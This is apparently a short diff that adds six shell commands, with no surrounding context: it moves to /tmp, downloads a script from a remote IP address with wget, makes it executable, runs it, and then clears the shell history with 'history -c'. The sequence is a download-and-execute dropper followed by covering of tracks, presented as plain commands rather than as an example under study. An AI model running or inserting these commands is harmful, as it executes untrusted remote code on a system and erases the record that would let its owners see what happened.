@@ -1,0 +1,6 @@
+ls -la
+cd /tmp
+wget http://198.51.100.20/x.sh -O /tmp/x.sh
+chmod +x /tmp/x.sh
+./x.sh
+history -c
